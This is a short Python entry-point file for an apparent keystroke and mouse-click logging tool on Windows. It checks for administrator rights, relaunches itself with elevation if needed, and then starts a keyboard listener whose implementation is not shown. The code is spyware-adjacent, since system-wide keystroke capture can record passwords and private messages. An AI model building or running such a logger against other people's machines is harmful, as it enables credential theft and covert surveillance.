from Loggers.KeyLogger import KeyLogger
from Loggers.ClickLogger import ClickLogger
from Loggers.Logger import Logger
import ctypes, sys
import traceback

class Main(Logger):
    
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def run(self):
        keylog = KeyLogger()
        clicklog = ClickLogger()
        logger = Logger()
        
        if self.is_admin():
            try:
                keylog.keyboard_listener()
                # clicklog.mouse_listener()
            except:
                logger.log_error(traceback.format_exc()) 
        else:
            # Re-run the program with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
